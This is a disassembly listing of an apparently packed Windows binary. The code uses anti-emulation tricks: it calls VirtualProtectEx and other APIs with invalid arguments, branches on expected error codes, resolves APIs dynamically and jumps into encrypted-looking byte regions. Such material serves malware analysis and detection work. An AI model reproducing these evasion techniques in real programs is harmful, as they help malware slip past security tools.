0x00401000:	pushl	%ebp	; from: 0x00416950(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0x70, %esp
0x00401006:	movl	$0x0, -72(%ebp)
0x0040100d:	movl	$0x0, -24(%ebp)
0x00401014:	movl	$0x0, -112(%ebp)
0x0040101b:	movl	$0x0, -96(%ebp)
0x00401022:	movl	$0x0, -8(%ebp)
0x00401029:	movl	$0x0, -108(%ebp)
0x00401030:	movl	$0x0, -104(%ebp)
0x00401037:	movl	$0x0, -20(%ebp)
0x0040103e:	movl	$0x0, -76(%ebp)
0x00401045:	movl	$0x0, -16(%ebp)
0x0040104c:	movl	$0x0, -88(%ebp)
0x00401053:	movl	$0x0, -4(%ebp)
0x0040105a:	movl	$0x0, -92(%ebp)
0x00401061:	movl	$0x0, -48(%ebp)
0x00401068:	movl	$0x0, -84(%ebp)
0x0040106f:	movl	$0x0, -44(%ebp)
0x00401076:	movl	$0x0, -80(%ebp)
0x0040107d:	movl	$0x0, -12(%ebp)
0x00401084:	movl	0x00448fa8, %eax
0x00401089:	movl	%eax, -40(%ebp)
0x0040108c:	movl	0x00448fac, %ecx
0x00401092:	movl	%ecx, -36(%ebp)
0x00401095:	movl	0x00448fb0, %edx
0x0040109b:	movl	%edx, -32(%ebp)
0x0040109e:	movb	0x00448fb4, %al
0x004010a3:	movb	%al, -28(%ebp)
0x004010a6:	movl	0x00448fb8, %ecx
0x004010ac:	movl	%ecx, -64(%ebp)
0x004010af:	movl	0x00448fbc, %edx
0x004010b5:	movl	%edx, -60(%ebp)
0x004010b8:	movl	0x00448fc0, %eax
0x004010bd:	movl	%eax, -56(%ebp)
0x004010c0:	movw	0x00448fc4, %cx
0x004010c7:	movw	%cx, -52(%ebp)
0x004010cb:	movb	0x00448fc6, %dl
0x004010d1:	movb	%dl, -50(%ebp)
0x004010d4:	movl	$0x40, -48(%ebp)
0x004010db:	leal	-64(%ebp), %eax
0x004010de:	pushl	%eax
0x004010df:	leal	-16(%ebp), %ecx
0x004010e2:	pushl	%ecx
0x004010e3:	call	ConvertSidToStringSidW@advapi32.dll	; targets: 0xff000020(MAY)
0x004010e9:	testl	%eax, %eax
0x004010eb:	je	0x004152d6	; targets: 0x004010f1(MAY), 0x004152d6(MAY)
0x004010f1:	movl	-16(%ebp), %edx	; from: 0x004010eb(MAY)
0x004010f4:	addl	$0x1, %edx
0x004010f7:	movl	%edx, -16(%ebp)
0x004010fa:	aaa	
0x004010fb:	shrl	$0x27, %esp
0x004010fe:	outsb	%ds:(%esi), %dx
0x00401100:	addl	%edi, %ebx
0x00401102:	pushl	%eax
0x00401103:	cwtl	
0x00401104:	js	0x00401144	; targets: 0x00401106(MAY), 0x00401144(MAY)
0x00401106:	pushl	%ecx	; from: 0x00401104(MAY)
0x00401107:	movb	%al, 0x2b0e0165
0x0040110c:	xorb	-91(%ecx), %dh
0x0040110f:	rcrb	$0xa, -85(%eax)
0x00401113:	pushl	%ebx
0x00401114:	xorl	$0x2d5804e8, 0x358210bd
0x0040111e:	pushl	%cs
0x0040111f:	jae	0x00401174	; targets: 0x00401174(MAY)
0x00401124:	popl	%ecx	; from: 0x0040119c(MAY)
0x00401125:	pushl	%edi
0x00401144:	popl	%eax	; from: 0x00401104(MAY)
0x00401145:	xlat	
0x00401146:	pushl	%edx
0x00401147:	outsl	%ds:(%esi), %dx
0x00401149:	outl	%eax, %dx
0x0040114a:	xorb	$0x31, %al
0x0040114c:	popl	%edx
0x0040114d:	roll	%cl, %ss:0x34ea6f1a(%edi)
0x00401154:	arpl	%sp, -98(%ebx,%edx)
0x00401158:	addb	$0xffffff87, 0x171b508b(%ebx)
0x0040115f:	sti	
0x00401160:	loop	0x004011b2	; targets: 0x004011b2(MAY), 0x00401162(MAY)
0x00401162:	ja	0x00401183	; targets: 0x00401183(MAY), 0x00401164(MAY)	; from: 0x00401160(MAY)
0x00401164:	andb	(%ecx), %dh	; from: 0x00401162(MAY)
0x00401167:	cli	
0x00401168:	rorl	%cl, %esp
0x0040116a:	testb	%ch, -1382609109(%esp,%ecx,4)
0x00401174:	testl	%esp, -68(%eax)	; from: 0x0040111f(MAY)
0x00401177:	incl	%ecx
0x00401178:	incl	%ebp
0x00401183:	adcl	$0x6bf4bfd4, %eax	; from: 0x00401162(MAY)
0x00401187:	imull	$0x37, %eax, %esp	; from: 0x004011b2(MAY)
0x00401188:	loopne	0x004011c1	; targets: 0x004011c1(MAY)
0x0040118a:	xchgl	%esi, (%esi)
0x0040118c:	popl	%eax
0x0040118d:	movsl	%ds:(%esi), %es:(%edi)
0x0040118e:	movl	$0xbc4a18e5, %esp
0x00401193:	movl	$0x35b0463b, %ebp
0x00401198:	popl	%ebx
0x0040119a:	jecxz	0x004011d2	; targets: 0x0040119c(MAY), 0x004011d2(MAY)
0x0040119c:	jle	0x00401124	; targets: 0x0040119e(MAY), 0x00401124(MAY)	; from: 0x0040119a(MAY)
0x0040119e:	movw	%fs, %bx	; from: 0x0040119c(MAY)
0x004011a0:	popl	%ds
0x004011a1:	orb	$0xffffff9d, %al
0x004011b2:	jb	0x00401187	; targets: 0x004011b4(MAY), 0x00401187(MAY)	; from: 0x00401160(MAY)
0x004011b4:	addb	%ah, -72(%eax)	; from: 0x004011b2(MAY)
0x004011b7:	orl	%edx, 0x64c957ba(%eax)
0x004011bd:	movb	$0x6, %cl
0x004011bf:	inl	%dx, %eax
0x004011c0:	inb	%dx, %al
0x004011c1:	daa		; from: 0x00401188(MAY)
0x004011c2:	decl	%esp
0x004011d2:	ret	$0x3cdc	; targets: unresolved	; from: 0x0040119a(MAY)

0x004152d6:	call	GetLastError@kernel32.dll	; targets: 0xff000060(MAY)	; from: 0x004010eb(MAY)
0x004152dc:	movl	%eax, -44(%ebp)
0x004152df:	movzwl	-44(%ebp), %eax
0x004152e3:	cmpl	$0x539, %eax
0x004152e8:	jne	0x00415319	; targets: 0x004152ea(MAY), 0x00415319(MAY)
0x004152ea:	movl	$0xe0d, -20(%ebp)	; from: 0x004152e8(MAY)
0x004152f1:	leal	-40(%ebp), %ecx
0x004152f4:	pushl	%ecx
0x004152f5:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000080(MAY)
0x004152fb:	movl	%eax, -96(%ebp)
0x004152fe:	movl	$0x3a, -84(%ebp)
0x00415305:	movb	$0x0, -52(%ebp)
0x00415309:	movl	$0xb7426bd7, -8(%ebp)
0x00415310:	movl	$0x122d67, -104(%ebp)
0x00415317:	jmp	0x0041532e	; targets: 0x0041532e(MAY)
0x00415319:	movb	$0x0, 0x00417038	; from: 0x004152e8(MAY)
0x00415320:	pushl	$0x42cfc8
0x00415325:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000080(MAY)
0x0041532b:	movl	%eax, -44(%ebp)
0x0041532e:	pushl	$0x0	; from: 0x00415317(MAY)
0x00415330:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000080(MAY)
0x00415336:	movl	%eax, -44(%ebp)
0x00415339:	pushl	GetModuleHandleA@kernel32.dll
0x0041533f:	popl	%edx
0x00415340:	movl	%edx, -108(%ebp)
0x00415343:	leal	-64(%ebp), %edx
0x00415346:	pushl	%edx
0x00415347:	movl	-96(%ebp), %eax
0x0041534a:	pushl	%eax
0x0041534b:	call	GetProcAddress@kernel32.dll	; targets: 0xff000070(MAY)

start:
0x00415418:	pushl	%ebp
0x00415419:	movl	%esp, %ebp
0x0041541b:	subl	$0x54, %esp
0x0041541e:	movl	$0x0, -52(%ebp)
0x00415425:	movl	$0x0, -4(%ebp)
0x0041542c:	movl	$0x0, -80(%ebp)
0x00415433:	movl	$0x0, -76(%ebp)
0x0041543a:	movl	$0x0, -48(%ebp)
0x00415441:	leal	-56(%ebp), %eax
0x00415444:	pushl	%eax
0x00415445:	pushl	$0x8
0x00415447:	call	GetTempPathA@kernel32.dll	; targets: 0xff000040(MAY)
0x0041544d:	call	GetLastError@kernel32.dll	; targets: 0xff000060(MAY)
0x00415453:	movl	%eax, -48(%ebp)
0x00415456:	leal	-72(%ebp), %ecx
0x00415459:	pushl	%ecx
0x0041545a:	call	GetLocalTime@kernel32.dll	; targets: 0xff000050(MAY)
0x00415460:	movl	-52(%ebp), %edx
0x00415463:	pushl	%edx
0x00415464:	call	0x00415493	; targets: 0x00415493(MAY)
0x00415469:	addl	$0x4, %esp	; from: 0x0041695e(MAY)
0x0041546c:	call	0x0041695f	; targets: 0x0041695f(MAY)
0x00415471:	movl	$0x0, -84(%ebp)	; from: 0x0041696d(MAY)
0x00415478:	jmp	0x00415483	; targets: 0x00415483(MAY)
0x0041547a:	movl	-84(%ebp), %eax	; from: 0x00415489(MAY)
0x0041547d:	addl	$0x1, %eax
0x00415480:	movl	%eax, -84(%ebp)
0x00415483:	cmpl	$0x64, -84(%ebp)	; from: 0x00415478(MAY)
0x00415487:	jae	0x0041548b	; targets: 0x00415489(MAY)
0x00415489:	jmp	0x0041547a	; targets: 0x0041547a(MAY)	; from: 0x00415487(MAY)
0x00415493:	pushl	%ebp	; from: 0x00415464(MAY)
0x00415494:	movl	%esp, %ebp
0x00415496:	subl	$0x3c, %esp
0x00415499:	pushl	%esi
0x0041549a:	movl	$0x0, -60(%ebp)
0x004154a1:	movl	$0x0, -56(%ebp)
0x004154a8:	movl	$0x0, -48(%ebp)
0x004154af:	movl	$0x0, -36(%ebp)
0x004154b6:	movl	$0x0, -28(%ebp)
0x004154bd:	movl	$0x0, -40(%ebp)
0x004154c4:	movl	$0x448fc8, -44(%ebp)
0x004154cb:	movl	$0xb39a8995, -36(%ebp)
0x004154d2:	movl	$0x0, -52(%ebp)
0x004154d9:	movl	-36(%ebp), %eax
0x004154dc:	movl	%eax, -32(%ebp)
0x004154df:	movl	$0x0, -4(%ebp)
0x004154e6:	movl	GetLastError@kernel32.dll, %ecx
0x004154ec:	movl	%ecx, -4(%ebp)
0x004154ef:	pushl	$0x0
0x004154f1:	pushl	$0x4e
0x004154f3:	pushl	$0x1e
0x004154f5:	pushl	$0x0
0x004154f7:	pushl	$0xffffffff
0x004154f9:	call	VirtualProtectEx@kernel32.dll	; targets: 0xff000010(MAY)
0x004154ff:	testl	%eax, %eax
0x00415501:	je	0x0041693e	; targets: 0x00415507(MAY), 0x0041693e(MAY)
0x00415507:	outb	%al, $0xffffffb3	; from: 0x00415501(MAY)
0x00415509:	adcl	0x68f685c4(%eax), %eax
0x0041550f:	addl	$0xe992f283, %eax
0x00415514:	pushl	%esp
0x00415515:	jmp	-2050541437	; targets: 0x86088d9d(MAY)
0x0041693e:	movl	-4(%ebp), %esi	; from: 0x00415501(MAY)
0x00416941:	call	%esi	; targets: 0xff000060(MAY)
0x00416943:	movl	%eax, -56(%ebp)
0x00416946:	cmpl	$0x57, -56(%ebp)
0x0041694a:	jne	0x00416958	; targets: 0x00416958(MAY), 0x0041694c(MAY)
0x0041694c:	movl	-32(%ebp), %edx	; from: 0x0041694a(MAY)
0x0041694f:	pushl	%edx
0x00416950:	call	0x00401000	; targets: 0x00401000(MAY)
0x00416958:	xorl	%eax, %eax	; from: 0x0041694a(MAY)
0x0041695a:	popl	%esi
0x0041695b:	movl	%ebp, %esp
0x0041695d:	popl	%ebp
0x0041695e:	ret	; targets: 0x00415469(MAY)

0x0041695f:	pushl	%ebp	; from: 0x0041546c(MAY)
0x00416960:	movl	%esp, %ebp
0x00416962:	subl	$0x124, %esp
0x00416968:	xorl	%eax, %eax
0x0041696a:	movl	%ebp, %esp
0x0041696c:	popl	%ebp
0x0041696d:	ret	; targets: 0x00415471(MAY)
